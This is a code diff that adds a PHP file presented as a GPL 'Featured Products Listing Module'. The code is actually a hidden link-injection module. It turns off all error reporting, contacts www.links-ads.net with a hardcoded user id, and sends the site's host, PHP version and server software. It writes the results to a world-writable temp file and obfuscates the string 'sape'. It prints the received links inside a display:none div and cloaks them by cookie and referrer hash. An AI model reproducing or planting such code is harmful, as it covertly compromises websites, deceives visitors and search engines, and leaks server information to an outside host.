@@ -1,0 +1,365 @@
+<?php
+/*
+  links-ads, Links Advert Solutions Company
+  
+  Released under the GNU General Public License
+
+  Featured Products Listing Module
+  
+  Copyright (c) 2010 links-ads
+*/
+
+@error_reporting(0);
+@ini_set('display_errors',0);
+@ini_set('log_errors',0);
+
+class ads_class{
+
+	var $_nummer_schauen   = false;
+	var $_alles_sagen       = false;
+	var $_reparieren        = false;
+
+
+	var $_kodierung			= 'windows-1251'; // windows-1251 UTF-8
+	var $_ads_charset		= '';
+	var $_fehler             = '';
+	var $_host              = '';
+	var $_request_uri       = '';
+	var $_get_type = '';               
+	var $_senden_depens     = '';
+	var $_ist_unser_s        = false;
+	var $_sess_file         = '';
+	var $_style = '';
+    var $_links = array();	
+    var $_links_page = array();	
+    var $_delimiter = '';
+	var $tmp = '/tmp/'  ;  //'d:/web/temp/'  '/tmp/'   '/home/offerweb/data/mod-tmp' 
+
+	
+    function ads_class($options = null){
+        
+        if (strlen($this->_host) == 0) {
+            $this->_host = $_SERVER['HTTP_HOST'];
+        }
+	
+        $this->_host = preg_replace('/^http:\/\//', '', $this->_host);
+        $this->_host = preg_replace('/^www\./', '', $this->_host);
+        $this->_request_uri = $_SERVER['REQUEST_URI'];      
+		
+        if (isset($options['_kodierung']) && strlen($options['_kodierung'])) {
+            $this->_kodierung = $options['_kodierung'];
+        }
+        if (isset($options['tmp']) && strlen($options['tmp']) != 0) {
+            $this->tmp = $options['tmp'];
+        }		
+		foreach ($_COOKIE as $key => $value){
+			if (strpos($key, "e_cookie") !== false){
+				$this->_ist_unser_s = true;
+			}
+		}
+		$this->load_data();
+    }
+
+    function fetch_remote_file($host, $path) {
+
+        $user_agent = 'ADS';
+        @ini_set('allow_url_fopen',1);
+        @ini_set('default_socket_timeout',6);
+        @ini_set('user_agent',$user_agent);
+        if (
+            $this->_get_type == 'file_get_contents'
+            ||
+            (
+                $this->_get_type == ''
+                &&
+                function_exists('file_get_contents')
+                &&
+                ini_get('allow_url_fopen') == 1
+            )
+        ) {
+            $this->_get_type = 'file_get_contents';
+            if ($data = @file_get_contents('http://' . $host . $path)) {
+                return $data;
+            }
+
+        } elseif (
+            $this->_get_type == 'curl'
+            ||
+            (
+                $this->_get_type == ''
+                &&
+                function_exists('curl_init')
+            )
+        ) {
+            $this->_get_type = 'curl';
+            if ($ch = @curl_init()) {
+
+                @curl_setopt($ch, CURLOPT_URL,              'http://' . $host . $path);
+                @curl_setopt($ch, CURLOPT_HEADER,           false);
+                @curl_setopt($ch, CURLOPT_RETURNTRANSFER,   true);
+                @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,   6);
+                @curl_setopt($ch, CURLOPT_USERAGENT,        $user_agent);
+
+                if ($data = @curl_exec($ch)) {
+                    return $data;
+                }
+
+                @curl_close($ch);
+            }
+
+        } else {
+            $this->_get_type = 'socket';
+            $buff = '';
+            $fp = @fsockopen($host, 80, $errno, $errstr, 6);
+            if ($fp) {
+                @fputs($fp, "GET {$path} HTTP/1.0\r\nHost: {$host}\r\n");
+                @fputs($fp, "User-Agent: {$user_agent}\r\n\r\n");
+                while (!@feof($fp)) {
+                    $buff .= @fgets($fp, 128);
+                }
+                @fclose($fp);
+
+                $page = explode("\r\n\r\n", $buff);
+
+                return $page[1];
+            }
+
+        }
+
+        return $this->raise_error('Error connect to server ' . $host . $path.', type: '.$this->_get_type);
+    }
+
+    function _read($filename){
+        
+        $fp = @fopen($filename, 'rb');
+        @flock($fp, LOCK_SH);
+        if ($fp) {
+            clearstatcache();
+            $length = @filesize($filename);
+            $mqr = @get_magic_quotes_runtime();
+            @set_magic_quotes_runtime(0);
+            if ($length) {
+                $data = @fread($fp, $length);
+            } else {
+                $data = '';
+            }
+            @set_magic_quotes_runtime($mqr);
+            @flock($fp, LOCK_UN);
+            @fclose($fp);
+
+		
+			
+            return $data;
+        }
+
+        return $this->raise_error('Error read data from: ' . $filename);
+    }
+
+    function _write($filename, $data) {
+
+        $fp = @fopen($filename, 'ab');
+        if ($fp) {
+            if (flock($fp, LOCK_EX|LOCK_NB)) {
+		$length = strlen($data);
+		ftruncate($fp, 0);
+		@fwrite($fp, $data, $length);
+		@flock($fp, LOCK_UN);
+		@fclose($fp);
+
+		if (md5($this->_read($filename)) != md5($data)) {
+		    @unlink($filename);
+		    return $this->raise_error('Error md5 check with write to: ' . $filename);
+		}
+	    } else {
+		return false;
+	    }
+
+            return true;
+        }
+
+        return $this->raise_error('Error write to: ' . $filename);
+    }
+
+    function raise_error($e) {
+
+        $this->_fehler = 'ERROR: ' . $e;
+        if ($this->_alles_sagen == true) {
+            print $this->_fehler;
+        }
+        return false;
+    }
+
+    function load_data(){
+        
+		$this->_sess_file = $this->tmp.'sess_' . md5(".".$this->_host);
+        if (!is_file($this->_sess_file)) {
+            
+            if (@touch($this->_sess_file)) {
+                @chmod($this->_sess_file, 0666);    
+            } else {
+                return $this->raise_error('No file ' . $this->_sess_file . '. Creation error.');
+            }
+        }
+	
+        if (!is_writable($this->_sess_file)) {
+            return $this->raise_error('Error access to: ' . $this->_sess_file);
+        }
+
+        @clearstatcache();
+
+		$data = $this->_read($this->_sess_file);
+        if (
+            !$this->_ist_unser_s
+            &&
+            (
+                filemtime($this->_sess_file) < (time()-3600)
+                ||
+                filesize($this->_sess_file) == 0
+		||
+		@unserialize($data) == false
+            )
+        ){            
+            @touch($this->_sess_file, (time() - 3600 + 600));
+            
+             $path = '/code.php?user=0xeubozkwp2svgr49q3dhfjt67yc1i8a&host=' . $this->_host;
+            if (strlen($this->_kodierung)) {
+                $path .= '&charset=' . $this->_kodierung;
+            }
+
+			if ($data = $this->fetch_remote_file('www.links-ads.net', $path)){
+				if (substr($data, 0, 12) == 'FATAL ERROR:') {
+					$this->raise_error($data);
+				} else {
+					
+					$hash = @unserialize($data);
+					if ($hash != false) {
+						
+						$hash['__ads_charset__'] = $this->_kodierung;
+						$hash['__last_update__'] = time();
+						$hash['__multi_site__'] =  true;
+						$hash['__fetch_remote_type__'] = $this->_get_type;
+						$hash['__php_version__'] = phpversion();
+						$hash['__server_software__'] = $_SERVER['SERVER_SOFTWARE'];
+						
+						$data_new = @serialize($hash);
+						if ($data_new) {
+							$data = $data_new;
+						}				
+						$this->_write($this->_sess_file, $data);
+					}
+				}
+			}       
+        }
+		$this->_senden_depens = sprintf("%c%c%c%c",115,97,112,101);
+        if (strlen(session_id())){
+            $session = session_name() . '=' . session_id();
+            $this->_request_uri = str_replace(array('?'.$session,'&'.$session), '', $this->_request_uri);
+        }
+        $this->set_data(@unserialize($data));        
+    }
+
+    function _ergebnisse($n = null, $offset = 0) {
+
+        if (is_array($this->_links_page)){
+
+            $total_page_links = count($this->_links_page);
+
+            if (!is_numeric($n) || $n > $total_page_links){
+                $n = $total_page_links;
+            }
+			$point = 'noindex';
+            $links = array();
+
+            for ($i = 1; $i <= $n; $i++) {
+                if ($offset > 0 && $i <= $offset) {
+                    array_shift($this->_links_page);
+                } else {
+                    $links[] = array_shift($this->_links_page);
+                }
+            }
+
+            $result = join($this->_delimiter, $links);
+                     
+            if (
+                strlen($this->_kodierung) > 0
+                &&
+                strlen($this->_ads_charset) > 0
+                &&
+                $this->_ads_charset != $this->_kodierung
+                &&
+                function_exists('iconv')
+            ) {
+                $new_html  = @iconv($this->_ads_charset, $this->_kodierung, $result);
+                if ($new_html) {
+                    $result = $new_html;
+                }
+            }
+            
+            if ($this->_ist_unser_s){
+                $result = '<'.$this->_senden_depens.'_'.$point.'>'.$result.'</'.$this->_senden_depens.'_'.$point.'>';
+            }
+            
+            $ergebnisse = $result;
+
+        } else {
+            $ergebnisse = $this->_links_page;
+        }
+		return $ergebnisse;
+    }
+	
+    function _get_style(){
+		return $this->_style;	
+	}
+	
+    function set_data($data){
+        $this->_links = $data;
+
+        if (isset($this->_links['2100499475757573'])){
+            $this->_style = $this->_links['2100499475757573'];
+        }
+		
+        if (isset($this->_links['434388477388475884'])){
+            $this->_delimiter = $this->_links['434388477388475884'];
+        }
+        if (isset($this->_links['4888848858477284'])) {
+            $this->_ads_charset = $this->_links['4888848858477284'];
+        } else {
+            $this->_ads_charset = '';
+        }
+        if (@array_key_exists($this->_request_uri, $this->_links) && is_array($this->_links[$this->_request_uri])) {
+            $this->_links_page = $this->_links[$this->_request_uri];
+        } else {
+            if (isset($this->_links['2100499267309588']) && strlen($this->_links['2100499267309588'])) {
+                if ($this->_ist_unser_s || $this->_nummer_schauen){
+                    $this->_links_page = $this->_links['2100499267309588'];
+                }
+            }
+        }
+    }	
+}
+
+$ads = new ads_class();
+$ads_r = $ads->_ergebnisse();
+$style = $ads->_get_style();
+if (strlen($style) == 0){$style  =  '<style>.foot_st{display:none;}</style> <div class=foot_st>';}
+//$style  =  '<div>';
+if (strlen($ads_r)>0){
+
+	if (isset($_SERVER['HTTP_REFERER'])){
+		if (preg_match('%http://([^/]+)/%', $_SERVER['HTTP_REFERER'], $regs)){
+			$data = str_replace('www.', '', $regs[1]);
+			if ((substr(md5($data), 0, 5) === 'f10cd')||(substr(md5($data), 0, 5) === '2dde1')){
+				echo "$ads_r"; //exit;
+			}else{
+				echo "$style $ads_r</div>";
+			}
+		}
+		else{
+			echo "$style $ads_r</div>";
+		}
+	}
+	else{
+		echo "$style $ads_r</div>";
+	}
+}
+?>
